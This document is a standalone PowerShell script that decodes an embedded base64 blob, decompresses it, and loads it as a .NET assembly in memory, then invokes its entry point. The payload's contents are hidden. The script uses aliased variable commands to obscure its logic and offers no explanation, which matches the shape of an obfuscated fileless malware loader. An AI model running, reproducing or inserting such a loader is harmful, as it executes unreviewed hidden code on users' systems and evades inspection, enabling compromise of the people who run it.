sv o (New-Object IO.MemoryStream);
$s0="7Vp9cFzVdT/37e7b1dpe++1akj8ke2Vb9kqWZUm2/BXbWF+2Fixh68s2A8j78Swt3t23fm/Xtuyams/hYyCQCVAyQ0MhbYAWOm4gkALTmFCmLUkDdIbGmeAxKclMKMME/miaTAL9nfueVruW5KT9j0nfas89X/fcc8859+q+97bvugfIRURufD//nOgltHztctorXWfxDSz/+wA9X/GDupfE3h/UDY2nrHDONMbMWCaciGWzRj4c18NmIRtOZcPd1w6GM0ZSb543z7/KsbGvh2ivUKj/Y8/opN1LtILmiBaiCAjF5jXvAQjje9jxLmzL2G++3KVOOX0U2nUH0QL5N9UWG3n9ZDfRtVeaJMab+wfEYtoF/3wlpA90bwndnNdP5tFuXGPrls61xMThZlNPGwnHh8OOTmO5HqLR+X9xka8FHFeyfVPIQwebiG5fQiTsodT/rb1NSgR9/EoECVEbl1mwo66Gv0tbVPoaAgJaszAZ1W8CzVXfx2PVVy1veiziRb8ImGvnqOYZyM6gLt3mD2fTuhnjuOvXVa++2QPkMxVZVa0KSOvPsiQC79dKxbnmHDGbDW+5DW3KhrfMxjzzz5TZbPjKbQSnbPjKbITc5noX5SJzIDMvMYY4+EMe84MZuKpqVntAzANxBrF0l9Jc91aA1bzmSnBDvsh8plYFV31Whe7CQDD85laIzB0ABpusWu43MD9/qMK8ii3BT3/Ibz7K/edEQkzN1eZWGwuBaXMXGZWy1fxGlUSMam781iJWnBfm4rYWA7cQEn8oEFnK4kCVUYPWqGXefHRaxtz5Vdr8+1PGcmYu0OZpCwxUtj+kaXNq7vPIgGo+rSJSB+YT9dVmv0q5J+oXSc+fqF8MKys41iuleIm2wMGWapqNRbCX+EPB8C9RfpF64OpnKsKkWqu5G9aX33YuKN2K+CEKhRaGFlqYghpaqC2sNrD4/NrCSAP73ihxYy3rYjH4jXUcS3YmVOk1mnms+i1fxVjB+sh6plZXhdas3YUu2LH8Pm2N0codBtTS4FfMzDbaeLA11QdDa7Q1FcYGUG3f1hZqqzW35tXckmFsZDBDZxkwox1gtbY6VHnRtfoi+7QJjG2HP//884uBYP1nVVhES43N4P2kKhRZu63oZmTKpFbh+DidZzsYgYMRLeI4+AocrJzdQaen9E7zaKHIFhZvZfHhMv81NYLsq1Wya6jKTlIVLwTV2CZZWpU2R+rUL7aVquuX2MiipbLVFtllvBhVtVhWlSyJyJcAmjzvNWHhoISrpZKx3a7jHdwsrtIWT5bkEi2gLak2djK+1F4INVqNsxBqnIVQoy21F0KNvRBqjKu4+O3VsOQ+xEGEaiPYif1ardFha8jir63SaidHWgY3l00v/gqu+uRlVV9TXvXLZq765XbUlpeWdlWooSTPDTPkuWGWPDcgzw1awxcuz93YEJGh0jzXTMuzk6Sw09Yh8OGqJRH85/Qv0eocTKuVhrVwmf0P+L9WMfEyrXVVWt1kWlfAqxWzpHX8ymldMXNaV9pBWlme1saStDbOkNbGWdLaiLQ2ao1fsLQqF3O/N6eRLhZ2A1R9zeiRzcIlk/GvRPzV03yIQAI4G4j+EwbOe/7VFytDayM4+fi1tQZOPn4jCnCRz1Ude+1zzFsoqbvQHkR/Ph+zTT56vQbwTbQpMPEfuOy6Hf9Q+IsNg2Ui1OKiIPS5Ol2RqzmEaQ6hqTohNI+Xk3/C5K2T5ALhMu9k4hoOR9AmzPtLxc+Uipkw/65U/K+lYibMd0vFn5aKmTB/Uyqu8paImTCXeUvE20rFTJidJWJrrzwF9gH6rX7AOaqBc7bfvJGV9nG3pd7LWcZ+BgMAjiQ9XTk9q/"; 
$s1="Kp6cqnZlW+a7ryXbMqPzxd+eFZlb8xXfkb05W9jcuU09hW3I0rFNcZiVytRAY5aNYQVzbOlyrqMdSiEM4xXIOa4ooMQ1RAfQm/us7n0I2qPHOrxgg7AbtyEXHLS4dbPpE7tvi+jv8rVvuV03yMbFqlyCUi17W98IJu4wD7IfmRg5xBVTnNZ9DRJjXgrvoMgzc2Wzhxqmf5yNu4W659l71St9ljdQ5e3SnkXYR973K8rbmlub1lcxuOIrya0oAPwK+VNxP9Fu1cnJhXDubNVHbMYg0fTrDPIwYrhwfplWr7nm3lnuEo1jp9H/RLcH5lZ9qIO2sPpDhQ+URFBTZL+o3YQPhnzaPzfPkmhu/F4J9cs5gSVTj3jKzj3OvIdc745P2wfTv2c8WehUr3KgdUlf5awhNKuzqfTnDc6ZveEbdKUYVhnH4HzlfcI24/DaqnfCo9SQz7PQy7xIh7Of0H74m0wjPiDtDXXeu9AXrL+4JXpethOUAve14AZ7OP4Wsu1qkHrlKb8mVI/8nN0PK+7vNjf5Ljwo5K90PTT8+LHR6VhqQPP5ZevQxPVKr1MbzBzT7cKRieklD3MlzgGgDMSekzEt4OGKCC9OSXguEbrtfB+Uh69ZjkrHYzfFtlGJCaH7rrhEr/gDmq9LaMxsdy1lnpYVL68IjvR4AkpU0exhcrDN+Uvd70vIEM3ejjmHzmZrjZw1BT1qMWiF6WmeC6EqiIRzyPeColroD6F2h0AFfpVrGAHkUCK8H3kwsU32AzNZdcdQvo15LyYCRBvaJLgQ+uPYDnXFcDun17lE30IvUpVZDvB2yXMAW4jw3RnYvcqABBN0rqYfqe+5AyRf2zMqooNG5r0t3Ih0LXN9iyJiUB2am1UuZ70pNR3HSrpG7xvehpAXXv2qkRPPS4pF6njb4GxUPvSOphOudehTj/2KGqfG+Sl35a0s9HH0nqNvoymYqPtuA2hujBRX51VJlbpjmXuqXsNsTpUTFF7QQ1r0iZoHjdCPo+UifoP+XaeBzxFnSJFx7dI/E3pLRVwjHUuEIalp2L3uG9g26TOq9LOzZ8C6vQrQrSAJEDQD+1SvxuCRskvECve8fpfer0GfDXrd4D/DnvA/QJvSeehTQlziGjTcqLyD7rx2iXeAV9b3Wdh/Qh1z+SEBHXmxSlTuVtqhDHxLuAbtd7gKbvA8BLqJn96PsB1Qm2cAj4h9QgnqNPqVUcd/038FfV30GzTnWJrSLorhAd4i9dQXGBvuJdLCrEO7RcCLHVtQqcR72NIiq2uFvFIVi7h6LiQ9cWcQvN9V4lHqX/8nUD/6nvasAf+faLlPhYPSBi4qJ6g1hIlzw3iRr6uXcC0kPem8Hpc98u7hbf9d4D/FPvA6KD+nxfhbTX9Sg0o74/Fw+KVahaHvcJ8A+4zsHbe11PwZNv+56DbxeI56jB80P0W+/z4NzkWy7+QnQqrwC+ilk/LR73vSa+IxaJHwLeqf67OC961YvibfGs+Jm4IN71fCSO0YPiPL0v/k18Kn6Bj1";
$s2="Au0GqvqvwCc2TO111zlIUy/hPU79WUT0Sfu1oRyrvKeVpItWKZcouUPijhLbKinyau+XOUlJl6Bt7W0Vr6ltJMc+hWwBB23GZaSs8ou2gl+E9K6Xcl/J6ElyRcQL9CDDYpLrl7v+w5gzWmou4E1oUL9ZsUlnDzc8Gy61f2yax4bVP4AQLXq6eE55Eq5Xoj8mGjC1y3fGbGo6HW6U+xqzzFou07t46Obhhtoe09J/VEIa8P5mNjurkz7nB3JkZHu1NWLh2b6ErHLMtmyj6tM/ZppWhPtpDRzVg8rR9upb0pK4/G6dM2Y5822l3IJg7PKKTevo6uwd6OtvZNNKbnR4eHdm9ha7S9z0gW0vpOPA8cnLDyeqY5ei0NS53oCFl2s0fPwpO8DjQZy8coYyUMM52K88Qmu3UZ6bSeyKeMrNUs9VMJ2mvEktSRTM6kM5jTE6lYOnVKT1K/fmJPIZWk7V2GcTSldxnZfCwFEzuPjo52xhJHcUbYndLTSRrQEcKELv2C4zrtiyWTkEq8K5Ub102Jsvt9umVh/tRl6kk9m8dYXbHEuE7R7HHjqE5T4aUop8awJI6xLQPtATOV1/fCCWkLDkq8x0rEcjoNIryQT+wzjbyRMNJDE8ycnKMJK7FcvoC2T8+PG8nOmKWTPQZ7bAIebG/Z2qWb+dSRVAKBZSe5GRzqGBoHmuzI42QURw7hUCaXSuvmZA5KRN16vDA2xm5frh7jGA/o6dhJiVlT8oECQpFBiDM5iOKpNKYxJXUKhzon8vbER2Lpgk7HJZw40p6fSCat5nj8SLN+spwhU+JkA7FNGBIZtnSe5b5UNsvkbtPIcDA2bbQPfjRklJHdxolsGjXjkMO5EmKPnmdTvTFrvNj5YCZdxKfUHGywELdsrC+WT4zLyGBubAD4cT0byxYt0rCZQnFljLxekhVMPpWUAeyKpdNxFKKc5aBuHtfNK+sNmbGsdcQwM7tT2Vgax1bw+vX8CcM8OlWPjrXyWrKXHirJKSg0mYyOiSQ60mMGNMcz1GFN5/E0pqiBWDZpZMhZA0VvKNplTuTyxhSj00C1x7KIUSprV+U4YwkJnZIe0I84y5b6YxmebkGfWsq0xzQKuRL6gB7vRQkjRFO8npMJPScxe0lEs0cMu+PkIFhfxwiDmzQw2GF7yYFOJXRE5ngK5hCuLDedhSNH0ExKjVQ23xfL8lZHZRsf7KPYHZyjetnuIsN/OW8Ib2nk2re79JimAUN63tku8qDs2PYXMvHiqgS3OWFD2djLuVtPyHlM0lgWDo3CnJx3dyo2ljWsfCph8Th2eCzq0K1i+O0l2zy5EzgTt5z172x/sjdvRMV+k5XVbEcTr+hy4xPNl+08shsvd4viEsZM3I9Fp4rUssNUQnNcuvUjsUI6P62kbW0se0ehVOIEuegfhxq1NVZIx8yekzkTtcp7lbQvS8NG7VpCdyuHvRP1h9zAhpXeZ6RTiQmZIYt0u8EGxHZ4LMyOdqPE0XClo7k2fhPKEYXDVTnpBaYADr45bIVklwMquCudgt/YyY6nTCObYVyWUME0i7iBxCAJMqnkbAJy/6AEA/yj4QauyLY3n8/B8IB+rKBbeQ57CTVk8H946sO+1M/vCUtChH1pTD9JHaYZm5DjXqNPyChze6VUY5uw9Ew8PUFy/+kychNk5EZ7jhXgal7i0aw+SU2Fo2hNjobVd9Iez8ai8NrGSuqgyMN1epzy+OTIom20Hp92aqNmfDfSVrSttFm2m/DZBt5G2kBNdHkfk3TKkAG";
$s3="ejvN9Ah/808eHLWVw4jxO2KOAJ6CTKdqh/d20m7bg5ehmaqEeaDPVCskGjNZDXbhj6ADdDUkLvm3Q2wJ+J7i78WXOFmi2Qb8LXuLRxZdG8PSgH08vErgfbIXmdZCOUIFwsKEd+DThTqINusfhZxv0WPOElNAt9w7RAYg2QXSATsL9QzQoHdpLN6H7GF2DYZOYdhyTGICJJAbuA38IZvaj7cegG9HzGvTrxCeBY1on7FwHF5LQOURHZdiScJft9tEp6BRke0ja74E8Cu0eKd0LPe7P/uTRPwq+bacN9HFnnG7Ie+lq0HHoDaPtB69H2u2CPxNob0LfjcV5DMtQZ2DnIPrlwD8F3in0m4AWt2PFYI2A2g9pC7Ah2aZpH7CjaHuAHYQnvZANS/oIJNgHrqA/JOfWjzaKkXjmUZRcP9oeRJP5nCg6+9BeJ3N7McQIxEynQV9He0DzZDKowxY5ac5gE83Ug9N0SKapIMM0AHfjxVqY3mMDNLgmNmDS03vQ2b9NoYlhBltlqXPptcgSTEJpKz4t4HBRxtDG4CaXbAKyLZAl5eLS8cAwCVke3x10Gj3OgGM5SyaFJZIFfzN02eY6aTWOEdehbzsirMOqDl4MeBxYuxyP63YdxuSlwtwYLGwg4cLztltat8sVm8HMduJJQtj5MJcVk2XcKWkeznDZ6ZD3AvJqMSA5AGgCT1IdtNaX6ZVaXz+j/e1wzwBvYpZRc79ntNyM/XgXCs/aL+yEudy7Uj9sbydjRHOOwG+c+GCPKjmJOsLbjh4JBLgVASfXOjy3oENr8euUMSyig7DfAf0BuesN0DGM3Y+67EAfXmLDSIYld8ao3PFOYqQM+saxRMexLOJy2Q3Bi2tQeVxp3zoNp1eg2IfRpRvYNnztaaxA6a6A8gQM61JyGk6dkdw+cLiyJvXbivq8r0xyNxS5PXJrNqUt3r6T0gJXYgwT04s9NhZ79EKjA25PStql5Aw+5MLLr3mniz4zB6/TXHiX5MKbLs/10CYXvh6eG3nsPvh67XnR0ghdRWswronUFOBRC6hmvPdpIOG15zhdp7VMp21GnbYynQ0z6mwo09k4o87GMp32GXXap3Tmlc6ESihEpIRCbEoo/GMsofD2r4TCrwmI/kp74fwdp++IPt/+N9F1p8eeIndYCJ8rTMIDRNMOeJuCCyuDtSJwGQgEgnWBQK0HPzwINgTX1Xr4A+ZcSMDmT7Be8hyR1lqptaOfD1dwqxoWtYFa1/wFQrC5ZVQZLAC6/CKgVgZ1JRDwhBVRs6h6gaJIkbAVWLaMlgm3Hyr8Xg5qGNCNN3YApLXCdcnz+TwkMCyYwXqMJrSzd9vNfTyzWo8X9n3Bsw/iCVDw7EOYdkCBAD";
$s4="08YTAe84Vd7LbPx54CwaMfHidMjApMCs+BMNEaPByGzae5CZ59lqOHp7cwcI4HQyOtnZOs79isVz0ygPiVGAckRB4ZF1gGysrn4UaIfDx/TBG/voFRHwNJwTrGrYEOfAAOAjNhD+1x355LHgxyAVO74PN5Cfh7cBZ+B8++bzc/U8NKTU1tjdT/hF0OVHiV4A7pFiLJ00Q4MURwhx2NX8Pz4NnfMQuuub0iOMycvuB+5gSjLq9QfC+eun5k8cZLd7vUYFRRFUUNAFvknUwnAlTLGRMVpDgVhDkHo/6wW6kJHgreoMXcEdA+4fyYbhk/7R9Sqg7gSNtvZIv3kXhMYpywBPTsR3VufhLodn7bJjtO/n7wCr+Bsy8c5HH/ocs7YPlkS9ebk2l+X4VfSNZT+A/5ZeQX6Nplv59rke/l/v/6Y7v+Bw==";
sv d (New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($s0+$s1+$s2+$s3+$s4),[IO.Compression.CompressionMode]::Decompress));
sv b (New-Object Byte[](1024));
sv r (gv d).Value.Read((gv b).Value,0,1024);
while((gv r).Value -gt 0){(gv o).Value.Write((gv b).Value,0,(gv r).Value);
sv r (gv d).Value.Read((gv b).Value,0,1024);}[Reflection.Assembly]::Load((gv o).Value.ToArray()).EntryPoint.Invoke(0,@(,[string[]]@()))|Out-Null